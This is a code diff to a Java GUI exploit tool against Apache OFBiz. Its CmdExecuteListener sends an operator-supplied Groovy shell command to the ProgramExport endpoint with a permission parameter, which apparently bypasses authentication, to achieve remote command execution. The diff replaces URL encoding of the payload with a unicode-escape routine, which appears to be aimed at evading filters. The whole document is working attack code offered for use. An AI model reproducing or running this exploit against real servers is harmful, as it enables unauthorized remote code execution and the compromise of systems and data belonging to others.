@@ -8,7 +8,6 @@ import javax.swing.*;
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
 import java.io.IOException;
-import java.net.URLEncoder;
 
 import static org.ofbiz.util.Check.*;
 
@@ -39,7 +38,7 @@ public class CmdExecuteListener implements ActionListener {
         }
 
         String vulUrl = url + "/webtools/control/ProgramExport?" + PERMISSION_TEXT;
-        String body = "groovyProgram=" + URLEncoder.encode(ShellManager.getGroovyShell(cmdText.getText()));
+        String body = "groovyProgram=" + Unicode(ShellManager.getGroovyShell(cmdText.getText()));
 
         Response response = Http.sendHttpsPostRequest(vulUrl, body, "application/x-www-form-urlencoded");
         try {
@@ -64,5 +63,16 @@ public class CmdExecuteListener implements ActionListener {
         } catch (IOException ex) {
             throw new RuntimeException(ex);
         }
+    }
+
+    public static String Unicode(String plaintext) {
+        StringBuilder encryptedText = new StringBuilder();
+
+        for (int i = 0; i < plaintext.length(); i++) {
+            char c = plaintext.charAt(i);
+            String unicode = String.format("\\u%04x", (int) c);
+            encryptedText.append(unicode);
+        }
+        return encryptedText.toString();
     }
 }
